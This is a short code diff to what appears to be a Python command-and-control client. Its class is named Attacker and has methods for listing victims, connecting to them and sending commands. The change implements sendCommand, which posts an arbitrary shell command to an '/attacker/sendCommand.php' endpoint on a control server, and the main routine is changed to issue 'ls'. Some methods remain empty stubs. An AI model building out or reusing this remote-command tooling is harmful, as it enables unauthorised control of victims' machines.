@@ -49,8 +49,10 @@ class Attacker:
     def connectToVictim(self, victim):
         pass
 
-    def sendCommand(self):
-        pass
+    def sendCommand(self, command):
+        return self.__session.request('POST',
+                    self.__serverUrl + '/attacker/sendCommand.php',
+                    data={'command':command})
 
     def disconnectFromVictim(self):
         pass
@@ -77,11 +79,11 @@ def main():
     attacker = Attacker()
     print('Requesting login...')
     printResponse(attacker.connectToServer(baseUrl))
-    print('Listing victims...')
-    victimsList = attacker.listVictims()
-    printResponse(victimsList)
+    #print('Listing victims...')
+    #victimsList = attacker.listVictims()
+    #printResponse(victimsList)
     #attacker.connectToVictim(victimsList[0])
-    #output = attacker.sendCommand('ls')
+    printResponse(attacker.sendCommand('ls'))
     #print(output)
     #attacker.disconnectFromVictim()
     printResponse(attacker.disconnectFromServer())
